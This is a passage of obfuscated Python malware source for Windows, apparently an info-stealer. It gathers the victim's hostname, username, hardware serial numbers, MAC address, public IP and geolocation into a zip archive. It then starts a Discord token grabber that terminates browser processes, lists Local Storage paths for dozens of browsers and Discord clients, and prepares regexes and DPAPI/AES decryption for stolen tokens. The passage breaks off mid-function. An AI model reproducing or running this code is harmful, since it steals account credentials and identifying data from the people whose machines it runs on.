        YQXDSCPDTUOJHPPENWLRQUDTVXDWHIYHMGFBNWTRERGENGTEDLALDYIPUJQTTRGPLIRWMKVCEIALPED = []
        NYCGYQBRICKRPEJBQEMQVNZXNTALDEROZPSKTMEFBVOSGOQYNRHAESVRMNEFEKUVGUWXXDLEZVVKQPELJECYFMQEK = ctypes.windll.kernel32.GetLogicalDrives()
        for v4r_letter in string.ascii_uppercase:
            if NYCGYQBRICKRPEJBQEMQVNZXNTALDEROZPSKTMEFBVOSGOQYNRHAESVRMNEFEKUVGUWXXDLEZVVKQPELJECYFMQEK & 1:
                IRHAGXLYRPUNJJOKZGEYHORRRRCITWFQZIARGACWNCOBAHYDSRXVAXVWNYHHELBIEPOBKGFYXFMDHAOWLTX = v4r_letter + ":\\"
                try:
                    DEKNILQYZAGCUNPGIFQRELZOYJYDZJDLWLHHZSAIHGIKAYGWKDIPCRAHMCLVWJUXJOBNFAGBLNJ = ctypes.c_ulonglong(0)
                    LPZUPQDXKVGPQDANOXLDZPJXNRHGNJIQBVLPKWOIHSSEUTOCOSHFNSCBE = ctypes.c_ulonglong(0)
                    ctypes.windll.kernel32.GetDiskFreeSpaceExW(ctypes.c_wchar_p(IRHAGXLYRPUNJJOKZGEYHORRRRCITWFQZIARGACWNCOBAHYDSRXVAXVWNYHHELBIEPOBKGFYXFMDHAOWLTX), None, ctypes.pointer(LPZUPQDXKVGPQDANOXLDZPJXNRHGNJIQBVLPKWOIHSSEUTOCOSHFNSCBE), ctypes.pointer(DEKNILQYZAGCUNPGIFQRELZOYJYDZJDLWLHHZSAIHGIKAYGWKDIPCRAHMCLVWJUXJOBNFAGBLNJ))
                    SVNVNGTFDAYNACQRNODSVSYPTTOILUQMIIFKXCZNUNAOEXPKEDXYKPOECEK = LPZUPQDXKVGPQDANOXLDZPJXNRHGNJIQBVLPKWOIHSSEUTOCOSHFNSCBE.value
                    WSVXVEOEYYUBZPQRAIABIMKANTYHXIYRAYEGHXCOTDRBEVEVPDETLXXCXXTAPTFFQVRIABPSKIZZGOEDBUKCXQSODEM = DEKNILQYZAGCUNPGIFQRELZOYJYDZJDLWLHHZSAIHGIKAYGWKDIPCRAHMCLVWJUXJOBNFAGBLNJ.value
                    OQLDZMCKYZKUZQGTOZSTXYDFLQBGUSYTSCYMRTBBMLSGVGIFTWUCZIVTEGUOIDJWDAHZJPNNFRX = SVNVNGTFDAYNACQRNODSVSYPTTOILUQMIIFKXCZNUNAOEXPKEDXYKPOECEK - WSVXVEOEYYUBZPQRAIABIMKANTYHXIYRAYEGHXCOTDRBEVEVPDETLXXCXXTAPTFFQVRIABPSKIZZGOEDBUKCXQSODEM
                    KYDBZLKNNDECDHHEVQGAQZHJPHYSNBZWAPFKLBKALONUAELWMMBMJTBDIUBWKESLTLSY = win32api.GetVolumeInformation(IRHAGXLYRPUNJJOKZGEYHORRRRCITWFQZIARGACWNCOBAHYDSRXVAXVWNYHHELBIEPOBKGFYXFMDHAOWLTX)[0]
                    drive = {
                        'drive': IRHAGXLYRPUNJJOKZGEYHORRRRCITWFQZIARGACWNCOBAHYDSRXVAXVWNYHHELBIEPOBKGFYXFMDHAOWLTX,
                        'total': SVNVNGTFDAYNACQRNODSVSYPTTOILUQMIIFKXCZNUNAOEXPKEDXYKPOECEK,
                        'free': WSVXVEOEYYUBZPQRAIABIMKANTYHXIYRAYEGHXCOTDRBEVEVPDETLXXCXXTAPTFFQVRIABPSKIZZGOEDBUKCXQSODEM,
                        'used': OQLDZMCKYZKUZQGTOZSTXYDFLQBGUSYTSCYMRTBBMLSGVGIFTWUCZIVTEGUOIDJWDAHZJPNNFRX,
                        'name': KYDBZLKNNDECDHHEVQGAQZHJPHYSNBZWAPFKLBKALONUAELWMMBMJTBDIUBWKESLTLSY,
                    }
                    YQXDSCPDTUOJHPPENWLRQUDTVXDWHIYHMGFBNWTRERGENGTEDLALDYIPUJQTTRGPLIRWMKVCEIALPED.append(drive)
                except:
                    ()
            NYCGYQBRICKRPEJBQEMQVNZXNTALDEROZPSKTMEFBVOSGOQYNRHAESVRMNEFEKUVGUWXXDLEZVVKQPELJECYFMQEK >>= 1

        KMWRHMRXDRFNPQRMWZDBELGZPVFXCVWXETEPWMQPHFAODVKFYPRERVJSMRGTIFUFDZF = "   {:<7} {:<10} {:<10} {:<10} {:<20}".format("Drive:", "Free:", "Total:", "Use:", "Name:")
        for v4r_drive in YQXDSCPDTUOJHPPENWLRQUDTVXDWHIYHMGFBNWTRERGENGTEDLALDYIPUJQTTRGPLIRWMKVCEIALPED:
            XANDVRGWMWHCUUYLWEWWJJNGHGZHFLDPBAXTRGKHCPKYJONSFZAPEQMUIFMPFSPYESFHPGWPPY = (v4r_drive['used'] / v4r_drive['total']) * 100
            WSVXVEOEYYUBZPQRAIABIMKANTYHXIYRAYEGHXCOTDRBEVEVPDETLXXCXXTAPTFFQVRIABPSKIZZGOEDBUKCXQSODEM_gb = "{:.2f}GO".format(v4r_drive['free'] / (1024 ** 3))
            SVNVNGTFDAYNACQRNODSVSYPTTOILUQMIIFKXCZNUNAOEXPKEDXYKPOECEK_gb = "{:.2f}GO".format(v4r_drive['total'] / (1024 ** 3))
            XANDVRGWMWHCUUYLWEWWJJNGHGZHFLDPBAXTRGKHCPKYJONSFZAPEQMUIFMPFSPYESFHPGWPPY_str = "{:.2f}%".format(XANDVRGWMWHCUUYLWEWWJJNGHGZHFLDPBAXTRGKHCPKYJONSFZAPEQMUIFMPFSPYESFHPGWPPY)
            KMWRHMRXDRFNPQRMWZDBELGZPVFXCVWXETEPWMQPHFAODVKFYPRERVJSMRGTIFUFDZF += "\n - {:<7} {:<10} {:<10} {:<10} {:<20}".format(v4r_drive['drive'], 
                                                                   WSVXVEOEYYUBZPQRAIABIMKANTYHXIYRAYEGHXCOTDRBEVEVPDETLXXCXXTAPTFFQVRIABPSKIZZGOEDBUKCXQSODEM_gb,
                                                                   SVNVNGTFDAYNACQRNODSVSYPTTOILUQMIIFKXCZNUNAOEXPKEDXYKPOECEK_gb,
                                                                   XANDVRGWMWHCUUYLWEWWJJNGHGZHFLDPBAXTRGKHCPKYJONSFZAPEQMUIFMPFSPYESFHPGWPPY_str,
                                                                   v4r_drive['name'])
    except:
        KMWRHMRXDRFNPQRMWZDBELGZPVFXCVWXETEPWMQPHFAODVKFYPRERVJSMRGTIFUFDZF = """   Drive:  Free:      Total:     Use:       Name:       
   None    None       None       None       None     
"""

    try:
        def IsPortable():
            try:
                battery = psutil.sensors_battery()
                return battery is not None and battery.power_plugged is not None
            except AttributeError:
                return False

        if IsPortable():
            RXRXCXFBVZALEQOTLCATLZYEUQVYRHIVMPSCJAOXNZGYLVWAJWCLNKFEIPQSYUNCWYOYHBF = 'Pc Portable'
        else:
            RXRXCXFBVZALEQOTLCATLZYEUQVYRHIVMPSCJAOXNZGYLVWAJWCLNKFEIPQSYUNCWYOYHBF = 'Pc Fixed'
    except:
        RXRXCXFBVZALEQOTLCATLZYEUQVYRHIVMPSCJAOXNZGYLVWAJWCLNKFEIPQSYUNCWYOYHBF = "None"

    try: XRBKKRLQVJDIURDHCGHHRDZFFZPLAATVEPKCPTVVZUUHGBPSQDEVGDPCPXQPSCTEJPLOCEFVILQNYVQUQKUNEWAGSTXWDIEP = len(screeninfo.get_monitors())
    except: XRBKKRLQVJDIURDHCGHHRDZFFZPLAATVEPKCPTVVZUUHGBPSQDEVGDPCPXQPSCTEJPLOCEFVILQNYVQUQKUNEWAGSTXWDIEP = "None"

    TUBBVLHRLECJDFXJXMWLFCZBJMSWYZSNGZGDOBCXOPSZGWOMXAWRIEFMVAKJTORFEXQVRCOMGUM_system_info = "Yes"
    DCFXDQJQKBBHCYGBACOPNMSXVPFOAZCPQDBDGQUDPWRGXNEPOARBWSNRTIEONUAVJRQHRLJAEZXUNFQNLQLTCRTDJYXYGK = f"""
User Pc:
 - Hostname    : {BZJKBOXPOJRTXZUXMOGUWDVDQJPFDYNYGCYFMYMLKEUSSNINJH}
 - Username    : {TABABGYGNEGEGTRMWONKLNRFKAROZGLEJSGWNNUOZZDDOSCZHBZCJIFJYGIPKOFVDVGLIILLYBFLIJWZELK}
 - DisplayName : {MSHFCCICDZXNXUIOQIMFVBHSAOTRBSYVCEWJCGHYOHDBLRSPSYUMGZLZAOZMFE}

System:
 - Plateform     : {RXRXCXFBVZALEQOTLCATLZYEUQVYRHIVMPSCJAOXNZGYLVWAJWCLNKFEIPQSYUNCWYOYHBF}
 - Exploitation  : {YQEUOFTBOBBWGFZXQBLKCJUIRAOZNPNPOENCBKGXCNYIPFSEXKOPMVP} {FHZXVVJSOPWHKJPNRIOAYRAJUHZVAKCNTCUHPVUZZFWODXKUMOSHTYUBXALUWVOOMMMMFWGMPDFVPJWQURC}
 - Screen Number : {XRBKKRLQVJDIURDHCGHHRDZFFZPLAATVEPKCPTVVZUUHGBPSQDEVGDPCPXQPSCTEJPLOCEFVILQNYVQUQKUNEWAGSTXWDIEP}

Peripheral:
 - CPU : {DGPOFDQJIUYSCJDQDMCLTBSNJEGWOAVIDIDVEBOHZQRTESQPAIUKBB}, {MCSCUDJMPSPVSIOODLZCEIGKRRAKJUVKKQUCOUPSEJSCQPPNGSLDXUCRFKYRSPVZCMAHPYUNEMNQSBWZUYVLSBSKBPWWZX} 
 - GPU : {UDQXXXGEOKHDRPEZVDZTTLGWQZLHKRECYQCSIPWYMFYXZNZYZKXSPPAPTOFPGDLYWTDYROTGVJVJBBXWZGLRWIDDLI}
 - RAM : {YOKEYUAXIEYYLJZIECZPKNRNLJOXECMSPHCASLJGESTXGZYTMOPWHUVHCHXAWUQY}

Disk:
{KMWRHMRXDRFNPQRMWZDBELGZPVFXCVWXETEPWMQPHFAODVKFYPRERVJSMRGTIFUFDZF}

Serial Number:
 - MAC                       : {ELMZFKSWRSBHILBYEMBDJNYZVIRBWDPTEJMUBSVWINKBHMSFUAWMQVJVYHQSYLX}
 - Machine Id                : {VMFLTYTWIQQNZSVBPCRMMUHLOOVOKDFXTEDNKIJGVMMDQQVRWFZPWQOLRWRQRJWVNDZDCOUAPCAGX}
 - Machine Guid              : {OKHDZNLVFLCPGPGLIQHJLHJAVZSJVCJOJRCVKBWPDFWGVOLIOYCTTKHRXTTQUCNNMAAZTDQDSRTFZNIPKWLVFZCWEGBTVBZCA}
 - Hw Profile Guid           : {EFOVPQJHRHNWTPVOITCOILLXIBWTNJTULGNZXMYJJJXKMRGGQIJGJVLOKRWQTBSVEAWGITFAPEEJLLZJURCOFWCEJPK}
 - Nvidia System Id          : {AJGDNVGXXOTGMIYTJJIAMWRJNOIZWYOXLSRQALDHDZIOFTQULCOVAUUWKUL}
 - Guid Serial Number        : {QQAQCQRTJOKHMRPFSINYCZNSXUSLTAPHSEFPDTEHEUFQBCKHITJYNEIBYRJCOPNCEJTDSCZHTIHUHTZXIMSCRPYJP}
 - Uuid Serial Number        : {ROEFYFVNECNRWVPORSWWDBMLTYAMYVZMRHKWSAJULOISMJMYKVSDJNOQPNVYRDSKRYZOBTKCIGGUEBJVGHJ}
 - Motherboard Serial Number : {KOHXGZCBUUHRHBPZWZJTJQUSRXNRABYSCHCOPCQTCEHOLMGSNGYQMZSHQJJATAWMJDYBQUNLHVJFLKUMLTXGXNKSXPDNZ}
 - Motherboard Product       : {RXCLRWXVXXJGPRBPBUYMMQDIEGUCJSJQWWJXLNAERGXIVYWBYKETPOOBGRNJDPATCNL}
 - Motherboard Manufacturer  : {FVNVMLFQVDNWUSRYOFKQORWSNLKMAHOJQBHXHCNHGLCMYCVKNZURVVUXOEXFXAXFKTKSRBFVQ}
 - Processor Serial Number   : {TTGWVTAVCYYRYJOJXFBSEJOBMKFMBQJFBDPUYZOPILILNBNGNBWFZ}
 - Bios Serial Number        : {KFILEYYJNNNCRVGPMQGOVLNEOMDNEXEEZOVKDRPHFOYQUASOYQGKRSVMUUP}
 - Bios Release Date         : {FJHJAWJNUWQIQUQRBLSLEXZNOUJNEDLRXPJUWMMINPPFLJHPUNRREPWFOYXF}
 - Bios Version              : {TVUGCAQBHLUWWNXDEULSPAWLQHGIXCMKSXEAOMUVDIAUQQJIHHKFTAXJ}
 - System Bios Version       : {MBLSCFOLJVOSQFTHGBRQKOPBPZVUTNWMQETSJLQRJRZQZXKPSIFYWDCWOWBESTXAHHIMQHEDJIBMGYXIQJKI}
 - System Version            : {PLSJYXKGDVDTUWLDTIXSWXPFRFYSHCZUCBEWJVCUDQZKOYCLWEASBXANDWLMZBWXFSKOQZSOVMMKXXKWHOCUUYJEY}
 - System Family             : {QXKXWMKTKZOZEEEEKOGVCIUBDQOQKCNSQMAWNZMIJXMYGGGILWSEMUVBHAKVAHGFHAEMJAQXIB}
 - System Manufacturer       : {WYTVRRATVKSNPKWCOSTUQLKLMAYUZQIKNNSBSUMZXFVKPJKMSMZOWTWBEPHNTDOMDUNGCREJCLCOYS}
 - System Product            : {DXGSTTCDNFHXIRTTNDGAZGDBFGVHNAKZTHCYGHPUPHMHRHLALTHIBWWFZQWQD}
 - System SKU                : {MDRQMKQSDEYVSGLYHHFOVROVMZNVZIQHREDLYACBLFHAYMAMPPWKIMSHXKXRAUEBHZSVW}
 - Oem String Serial Number  : {HTAGTEDLOFZARLUCHMGVPUWYLEBWUUBFBJQCPLAQHKQBAWGRKGWP}
 - Asset Tag Serial Number   : {VFDFEOGDYDVWDSAQAPVBFSVTISFAJYHTZLGKOCBTAUWZSEGBEUIXRHMEPY}

Ip:
 - Public : {BRMHIEVVSJOCHAPHFRRZHHEOTEYSUZSJDVOCWRYUQZFDKESQORWEOXNGHHZMIYPZOZUSWGKATQWZNXHPFYZQ}
 - Local  : {JLHPALQZDHECTHPEWZNEUOITWNGFEZQRQSRCOGIGRVYPAQMNIRRXTNHDJBCVGKRBRTURPQFUSDIRZIIUBUMINWKTZJT}

Ip Information:
 - Isp : {OFLFDTOFUATZSRUEAJYULSVZSDUFAYZXBCIPAUNBNYRNFAWYPPPWJVTCHAOSISSLSZCPQWHBLJMMZ}
 - Org : {VWTZXAWFBEGCFZRYHKKHDZQOHUOHAWLGYDZXAHGWFZDZHFMLTHJXVCHIO}
 - As  : {VEOWAIVGAVWXPZFGMTWKYMQTYWTHPIIFGLOIGRHWDDFSTKTXOFKLHEOLYWS}

Ip Location:
 - Country   : {NSYKSRGHKEWDLNRKIGYFHEIOECKGEEZXQOHZCLXJDGZAUZIGOAWQFSBSHQVOLLCC} ({NSYKSRGHKEWDLNRKIGYFHEIOECKGEEZXQOHZCLXJDGZAUZIGOAWQFSBSHQVOLLCC_code})
 - Region    : {WEVTETLGPNDJAPAWUTNMRIXIMOZOFPBKUVKNHXJBYFUKZXZQTPJKGBLEAJEHHRTUJPGITYZEZJTPDNWMHHUIZRB} ({WEVTETLGPNDJAPAWUTNMRIXIMOZOFPBKUVKNHXJBYFUKZXZQTPJKGBLEAJEHHRTUJPGITYZEZJTPDNWMHHUIZRB_code})
 - Zip       : {FTBBDNNPYDSQPIXKUDAVXTBSAZRXJKVNDTHOVCOQEKFNSNICIIHNMQYEJMCLRFAKMUDJSQHRHHPWAEIMURNGQVLTHNE}
 - City      : {HJEVFFLXNWIIMREGHHQPCGHSQUTPOPGFMVSKZFVTJVLXQXHVZVHBJQVKSPJBZPQFUORRQTRQ}
 - Timezone  : {DJOOECOALQYURJCKBGANRZJLTCJMEVVMFCZMCSLLEROSDHAYRGNZVWRCQUSELHWFCBIVWVGWPDGQUMSRKVLTDHIHBKMIA}
 - Longitude : {CCFKRTPYTZGTMLAEROZSWNSSPVBGMGHHUWLTFLHYTSXVYWNQMWTQWMZUMFIAYYZ}
 - Latitude  : {DTXIFGHYIKFDOYXWFTFBDHPNTMDJIXIYYQYESCIUUBUEPMRXBLZDSDAGBM}
"""
    TNGFVIMTFECFIRXADBETKMGKCNEPMHUTVLYJJZSKQYMIJLZFQIKOEAAVCXUVNYYHJXHMJXTSG.writestr("System Info.txt", DCFXDQJQKBBHCYGBACOPNMSXVPFOAZCPQDBDGQUDPWRGXNEPOARBWSNRTIEONUAVJRQHRLJAEZXUNFQNLQLTCRTDJYXYGK)

    return TUBBVLHRLECJDFXJXMWLFCZBJMSWYZSNGZGDOBCXOPSZGWOMXAWRIEFMVAKJTORFEXQVRCOMGUM_system_info

def THBLIOUFXHZAUYMPAOIIXBTEVSMTIDKUXCIGBUJCRYHGRBYMOMPPZQALHLGXHCROSYISY(TNGFVIMTFECFIRXADBETKMGKCNEPMHUTVLYJJZSKQYMIJLZFQIKOEAAVCXUVNYYHJXHMJXTSG):
    import os
    import re
    import json
    import base64
    import requests
    import psutil
    from Cryptodome.Cipher import AES
    from win32crypt import CryptUnprotectData

    ASIVVNHMWZLBZIALNFLTPPYJILMEDRNSYXIZOBUPXNCJVSJLBNLWGBECOUQFTGJGJDHB = ""
    PLVUMDYCXFHKGEESNFQSVVPXDRMWQTPSAWPZMEMNPCOAILLMNRULLGMUDOXZUWXMUCFBQDUWJJBPBGVLYOTCWCG = 0

    def PHUFGEVVASASQYQRUOXLBTFFSROPRTOLFADUJXTTZKWDMELXLSOJLAFOCHLZRWDMBOFQOKMSPZRIYZUMZVGYFMOLBSBWWWRU():  
        WQFMYBPPIXCWRFWUPXFARNMOPBWGRMCMVCZISDYVFQEGGXZFJJKSMEBPJJACGEKMLRTNZGAFVLCQCZUZRDSAMQVMSPNSO = "https://discord.com/api/v9/users/@me"
        ESOHHSRXJNKUJZYSXCFYFULFVYMLGBWDSKFYNFOKDEITKOXACWKWYLXCM = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        ESOHHSRXJNKUJZYSXCFYFULFVYMLGBWDSKFYNFOKDEITKOXACWKWYLXCM_enc = r"dQw4w9WgXcQ:[^\"]*"
        AYPRABSIUFBJGSGKKOFFWXHMIPAAIHAYUXZFYLADVPOTVQCBCCMAMVAZQIIJFJFYSQWOZOTK = []
        FPTBLYZIDUVNUSQHXZFEUDJCMEMMKDVZPZBHZLOWOEYNXOYVJCJLYITFTXZTRWPRXGQNBCMK = []
        WPQPAPENKIMWEBHFVRCAFAUJPTMJZUFBWNRFVOJLNTNQKWFMPVQUHLJCLCOMMZHRXAS = {}

        AQHNGGGMUXEYNTIFAQXUNEKBWJLQOKSKDHIKKBBYGYYTEWTYMNARAKTAQIU = [
            ("Discord",                os.path.join(CSBGXLWEELTWJYMXXHZDWKKYVATTVHAVQFZAYTEHKZGXEYLMJZHOPTMJNMYFR, "discord", "Local Storage", "leveldb"),                                                  ""),
            ("Discord Canary",         os.path.join(CSBGXLWEELTWJYMXXHZDWKKYVATTVHAVQFZAYTEHKZGXEYLMJZHOPTMJNMYFR, "discordcanary", "Local Storage", "leveldb"),                                            ""),
            ("Lightcord",              os.path.join(CSBGXLWEELTWJYMXXHZDWKKYVATTVHAVQFZAYTEHKZGXEYLMJZHOPTMJNMYFR, "Lightcord", "Local Storage", "leveldb"),                                                ""),
            ("Discord PTB",            os.path.join(CSBGXLWEELTWJYMXXHZDWKKYVATTVHAVQFZAYTEHKZGXEYLMJZHOPTMJNMYFR, "discordptb", "Local Storage", "leveldb"),                                               ""),
            ("Opera",                  os.path.join(CSBGXLWEELTWJYMXXHZDWKKYVATTVHAVQFZAYTEHKZGXEYLMJZHOPTMJNMYFR, "Opera Software", "Opera Stable", "Local Storage", "leveldb"),                           "opera.exe"),
            ("Opera GX",               os.path.join(CSBGXLWEELTWJYMXXHZDWKKYVATTVHAVQFZAYTEHKZGXEYLMJZHOPTMJNMYFR, "Opera Software", "Opera GX Stable", "Local Storage", "leveldb"),                        "opera.exe"),
            ("Opera Neon",             os.path.join(CSBGXLWEELTWJYMXXHZDWKKYVATTVHAVQFZAYTEHKZGXEYLMJZHOPTMJNMYFR, "Opera Software", "Opera Neon", "Local Storage", "leveldb"),                             "opera.exe"),
            ("Amigo",                  os.path.join(RCNFFRTLAHDBXLSHMVHIICPVPDZXXCQNQTWSFZBASXGSAOKSFLEIYQVCLGDTWJIDRXYZBNT,   "Amigo", "User Data", "Local Storage", "leveldb"),                                       "amigo.exe"),
            ("Torch",                  os.path.join(RCNFFRTLAHDBXLSHMVHIICPVPDZXXCQNQTWSFZBASXGSAOKSFLEIYQVCLGDTWJIDRXYZBNT,   "Torch", "User Data", "Local Storage", "leveldb"),                                       "torch.exe"),
            ("Kometa",                 os.path.join(RCNFFRTLAHDBXLSHMVHIICPVPDZXXCQNQTWSFZBASXGSAOKSFLEIYQVCLGDTWJIDRXYZBNT,   "Kometa", "User Data", "Local Storage", "leveldb"),                                      "kometa.exe"),
            ("Orbitum",                os.path.join(RCNFFRTLAHDBXLSHMVHIICPVPDZXXCQNQTWSFZBASXGSAOKSFLEIYQVCLGDTWJIDRXYZBNT,   "Orbitum", "User Data", "Local Storage", "leveldb"),                                     "orbitum.exe"),
            ("CentBrowser",            os.path.join(RCNFFRTLAHDBXLSHMVHIICPVPDZXXCQNQTWSFZBASXGSAOKSFLEIYQVCLGDTWJIDRXYZBNT,   "CentBrowser", "User Data", "Local Storage", "leveldb"),                                 "centbrowser.exe"),
            ("7Star",                  os.path.join(RCNFFRTLAHDBXLSHMVHIICPVPDZXXCQNQTWSFZBASXGSAOKSFLEIYQVCLGDTWJIDRXYZBNT,   "7Star", "7Star", "User Data", "Local Storage", "leveldb"),                              "7star.exe"),
            ("Sputnik",                os.path.join(RCNFFRTLAHDBXLSHMVHIICPVPDZXXCQNQTWSFZBASXGSAOKSFLEIYQVCLGDTWJIDRXYZBNT,   "Sputnik", "Sputnik", "User Data", "Local Storage", "leveldb"),                          "sputnik.exe"),
            ("Vivaldi",                os.path.join(RCNFFRTLAHDBXLSHMVHIICPVPDZXXCQNQTWSFZBASXGSAOKSFLEIYQVCLGDTWJIDRXYZBNT,   "Vivaldi", "User Data", "Default", "Local Storage", "leveldb"),                          "vivaldi.exe"),
            ("Google Chrome",          os.path.join(RCNFFRTLAHDBXLSHMVHIICPVPDZXXCQNQTWSFZBASXGSAOKSFLEIYQVCLGDTWJIDRXYZBNT,   "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),                 "chrome.exe"),
            ("Google Chrome",          os.path.join(RCNFFRTLAHDBXLSHMVHIICPVPDZXXCQNQTWSFZBASXGSAOKSFLEIYQVCLGDTWJIDRXYZBNT,   "Google", "Chrome", "User Data", "Profile 1", "Local Storage", "leveldb"),               "chrome.exe"),
            ("Google Chrome",          os.path.join(RCNFFRTLAHDBXLSHMVHIICPVPDZXXCQNQTWSFZBASXGSAOKSFLEIYQVCLGDTWJIDRXYZBNT,   "Google", "Chrome", "User Data", "Profile 2", "Local Storage", "leveldb"),               "chrome.exe"),
            ("Google Chrome",          os.path.join(RCNFFRTLAHDBXLSHMVHIICPVPDZXXCQNQTWSFZBASXGSAOKSFLEIYQVCLGDTWJIDRXYZBNT,   "Google", "Chrome", "User Data", "Profile 3", "Local Storage", "leveldb"),               "chrome.exe"),
            ("Google Chrome",          os.path.join(RCNFFRTLAHDBXLSHMVHIICPVPDZXXCQNQTWSFZBASXGSAOKSFLEIYQVCLGDTWJIDRXYZBNT,   "Google", "Chrome", "User Data", "Profile 4", "Local Storage", "leveldb"),               "chrome.exe"),
            ("Google Chrome",          os.path.join(RCNFFRTLAHDBXLSHMVHIICPVPDZXXCQNQTWSFZBASXGSAOKSFLEIYQVCLGDTWJIDRXYZBNT,   "Google", "Chrome", "User Data", "Profile 5", "Local Storage", "leveldb"),               "chrome.exe"),
            ("Google Chrome SxS",      os.path.join(RCNFFRTLAHDBXLSHMVHIICPVPDZXXCQNQTWSFZBASXGSAOKSFLEIYQVCLGDTWJIDRXYZBNT,   "Google", "Chrome SxS", "User Data", "Default", "Local Storage", "leveldb"),             "chrome.exe"),
            ("Google Chrome Beta",     os.path.join(RCNFFRTLAHDBXLSHMVHIICPVPDZXXCQNQTWSFZBASXGSAOKSFLEIYQVCLGDTWJIDRXYZBNT,   "Google", "Chrome Beta", "User Data", "Default", "Local Storage", "leveldb"),            "chrome.exe"),
            ("Google Chrome Dev",      os.path.join(RCNFFRTLAHDBXLSHMVHIICPVPDZXXCQNQTWSFZBASXGSAOKSFLEIYQVCLGDTWJIDRXYZBNT,   "Google", "Chrome Dev", "User Data", "Default", "Local Storage", "leveldb"),             "chrome.exe"),
            ("Google Chrome Unstable", os.path.join(RCNFFRTLAHDBXLSHMVHIICPVPDZXXCQNQTWSFZBASXGSAOKSFLEIYQVCLGDTWJIDRXYZBNT,   "Google", "Chrome Unstable", "User Data", "Default", "Local Storage", "leveldb"),        "chrome.exe"),
            ("Google Chrome Canary",   os.path.join(RCNFFRTLAHDBXLSHMVHIICPVPDZXXCQNQTWSFZBASXGSAOKSFLEIYQVCLGDTWJIDRXYZBNT,   "Google", "Chrome Canary", "User Data", "Default", "Local Storage", "leveldb"),          "chrome.exe"),
            ("Epic Privacy Browser",   os.path.join(RCNFFRTLAHDBXLSHMVHIICPVPDZXXCQNQTWSFZBASXGSAOKSFLEIYQVCLGDTWJIDRXYZBNT,   "Epic Privacy Browser", "User Data", "Local Storage", "leveldb"),                        "epic.exe"),
            ("Microsoft Edge",         os.path.join(RCNFFRTLAHDBXLSHMVHIICPVPDZXXCQNQTWSFZBASXGSAOKSFLEIYQVCLGDTWJIDRXYZBNT,   "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"),                "msedge.exe"),
            ("Uran",                   os.path.join(RCNFFRTLAHDBXLSHMVHIICPVPDZXXCQNQTWSFZBASXGSAOKSFLEIYQVCLGDTWJIDRXYZBNT,   "uCozMedia", "Uran", "User Data", "Default", "Local Storage", "leveldb"),                "uran.exe"),
            ("Yandex",                 os.path.join(RCNFFRTLAHDBXLSHMVHIICPVPDZXXCQNQTWSFZBASXGSAOKSFLEIYQVCLGDTWJIDRXYZBNT,   "Yandex", "YandexBrowser", "User Data", "Default", "Local Storage", "leveldb"),          "yandex.exe"),
            ("Yandex Canary",          os.path.join(RCNFFRTLAHDBXLSHMVHIICPVPDZXXCQNQTWSFZBASXGSAOKSFLEIYQVCLGDTWJIDRXYZBNT,   "Yandex", "YandexBrowserCanary", "User Data", "Default", "Local Storage", "leveldb"),    "yandex.exe"),
            ("Yandex Developer",       os.path.join(RCNFFRTLAHDBXLSHMVHIICPVPDZXXCQNQTWSFZBASXGSAOKSFLEIYQVCLGDTWJIDRXYZBNT,   "Yandex", "YandexBrowserDeveloper", "User Data", "Default", "Local Storage", "leveldb"), "yandex.exe"),
            ("Yandex Beta",            os.path.join(RCNFFRTLAHDBXLSHMVHIICPVPDZXXCQNQTWSFZBASXGSAOKSFLEIYQVCLGDTWJIDRXYZBNT,   "Yandex", "YandexBrowserBeta", "User Data", "Default", "Local Storage", "leveldb"),      "yandex.exe"),
            ("Yandex Tech",            os.path.join(RCNFFRTLAHDBXLSHMVHIICPVPDZXXCQNQTWSFZBASXGSAOKSFLEIYQVCLGDTWJIDRXYZBNT,   "Yandex", "YandexBrowserTech", "User Data", "Default", "Local Storage", "leveldb"),      "yandex.exe"),
            ("Yandex SxS",             os.path.join(RCNFFRTLAHDBXLSHMVHIICPVPDZXXCQNQTWSFZBASXGSAOKSFLEIYQVCLGDTWJIDRXYZBNT,   "Yandex", "YandexBrowserSxS", "User Data", "Default", "Local Storage", "leveldb"),       "yandex.exe"),
            ("Brave",                  os.path.join(RCNFFRTLAHDBXLSHMVHIICPVPDZXXCQNQTWSFZBASXGSAOKSFLEIYQVCLGDTWJIDRXYZBNT,   "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"),   "brave.exe"),
            ("Iridium",                os.path.join(RCNFFRTLAHDBXLSHMVHIICPVPDZXXCQNQTWSFZBASXGSAOKSFLEIYQVCLGDTWJIDRXYZBNT,   "Iridium", "User Data", "Default", "Local Storage", "leveldb"),                          "iridium.exe"),
        ]

        
        try:
             for WIXZIQPEDIMTPYLHEFWWSGGGBLTGHPXVHWZLBDLDEDORITWJFJYVVJNVYRYTJLFGKAUARNUFBJZZPDRBGKVXLWFYJ, ZLLUJSAKKLITXPDDTXCZXZDFQMZSSQLVWWEYHORDNANFVUXUXBVJRJAGOKHX, v4r_proc_name in AQHNGGGMUXEYNTIFAQXUNEKBWJLQOKSKDHIKKBBYGYYTEWTYMNARAKTAQIU:
                for v4r_proc in psutil.process_iter(['pid', 'name']):
                    try:
                        if v4r_proc.name().lower() == v4r_proc_name.lower():
                            v4r_proc.terminate()
                    except: pass
        except: pass

        for WIXZIQPEDIMTPYLHEFWWSGGGBLTGHPXVHWZLBDLDEDORITWJFJYVVJNVYRYTJLFGKAUARNUFBJZZPDRBGKVXLWFYJ, ZLLUJSAKKLITXPDDTXCZXZDFQMZSSQLVWWEYHORDNANFVUXUXBVJRJAGOKHX, v4r_proc_name in AQHNGGGMUXEYNTIFAQXUNEKBWJLQOKSKDHIKKBBYGYYTEWTYMNARAKTAQIU:
            if not os.path.exists(ZLLUJSAKKLITXPDDTXCZXZDFQMZSSQLVWWEYHORDNANFVUXUXBVJRJAGOKHX):

                continue
            AULZEXAMYMDBXDZPVWKFUFBWMUREQNQGBDWDPOQKJIIYQHDUXNGA = WIXZIQPEDIMTPYLHEFWWSGGGBLTGHPXVHWZLBDLDEDORITWJFJYVVJNVYRYTJLFGKAUARNUFBJZZPDRBGKVXLWFYJ.replace(" ", "").lower()
            if "cord" in ZLLUJSAKKLITXPDDTXCZXZDFQMZSSQLVWWEYHORDNANFVUXUXBVJRJAGOKHX:
                if not os.path.exists(os.path.join(CSBGXLWEELTWJYMXXHZDWKKYVATTVHAVQFZAYTEHKZGXEYLMJZHOPTMJNMYFR, AULZEXAMYMDBXDZPVWKFUFBWMUREQNQGBDWDPOQKJIIYQHDUXNGA, 'Local State')):
                    continue
